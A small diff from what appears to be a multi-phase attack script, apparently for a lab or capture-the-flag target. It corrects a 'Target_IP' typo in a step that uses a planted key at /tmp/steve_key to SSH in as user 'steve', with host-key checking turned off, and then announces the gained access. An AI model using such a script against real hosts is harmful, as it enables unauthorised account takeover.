@@ -69,7 +69,7 @@ def verify_ssh():
     """Verify SSH access as steve"""
     print("[*] Testing SSH as steve...")
     
-    RHOST = "<Tareget_IP>"
+    RHOST = "<Target_IP>"
     result = subprocess.run(
         ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
          "-i", "/tmp/steve_key", f"steve@{RHOST}", "whoami"],
@@ -109,7 +109,7 @@ def main():
     
     if verify_ssh():
         print("\n[+] Phase 3 complete! You now have SSH access as steve.")
-        print("    ssh -i /tmp/steve_key steve@<Tareget_IP>")
+        print("    ssh -i /tmp/steve_key steve@<Target_IP>")
     else:
         print("\n[-] Phase 3 failed. Check if cron is running or try again.")
 
